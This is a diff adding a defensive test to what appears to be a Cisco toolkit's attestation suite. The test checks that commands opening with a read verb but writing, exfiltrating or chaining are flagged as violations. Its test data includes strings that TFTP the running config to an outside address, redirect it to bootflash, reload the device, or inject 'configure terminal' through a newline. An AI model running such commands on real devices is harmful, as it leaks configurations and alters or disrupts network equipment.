@@ -222,6 +222,40 @@ def test_write_command_in_registry_is_violated():
         del sys.modules["fake_collector_with_write_cmd"]
 
 
+def test_a_write_tacked_onto_a_read_verb_violates_the_published_claim():
+    """The falsifier above uses a BARE write verb, which the verb-anchored regex already caught —
+    so it never probed the class that actually threatens this claim: a string that OPENS with a
+    legitimate read verb and then writes, egresses or chains.
+
+    `READ_ONLY_CMD.match()` accepts every command below (asserted, so this test fails loudly if
+    that premise ever changes). Until the claim was moved onto is_read_only_command(), each of them
+    made compute_attestation publish `read_only_command_surface: HOLDS` — the engine certifying a
+    read-only command surface while carrying a command that writes to bootflash, TFTPs the running
+    config off the box, or types `configure terminal` at the exec prompt on the next line.
+    """
+    import sys
+    import types
+    from cisco_toolkit.attestation import READ_ONLY_CMD
+    for cmd in ("show running-config | redirect bootflash:pwn.txt",  # NX-OS WRITES that file
+                "show running-config | tftp://10.0.0.9/pwn.txt",     # ships the config off-box
+                "show version ; reload",
+                "show version > bootflash:out.txt",
+                "show version\nconfigure terminal\nhostname PWNED"):
+        assert READ_ONLY_CMD.match(cmd.strip()), \
+            f"premise changed: {cmd!r} no longer passes the verb-anchored regex"
+        name = "fake_collector_tacked_on_write"
+        fake = types.ModuleType(name)
+        fake.COMMANDS_IOS = ["show version", cmd]
+        sys.modules[name] = fake
+        try:
+            c = _by_id(compute_attestation(collector_module=name))["read_only_command_surface"]
+            assert c["result"] == VIOLATED, \
+                f"attestation published {c['result']} for a registry containing {cmd!r}"
+            assert "COMMANDS_IOS" in c["detail"]
+        finally:
+            del sys.modules[name]
+
+
 # --------------------------------------------- missing source -> abstain ---
 def test_missing_package_source_is_not_evaluated_with_reason(tmp_path):
     att = compute_attestation(toolkit_dir=str(tmp_path / "wheel-without-sources"))
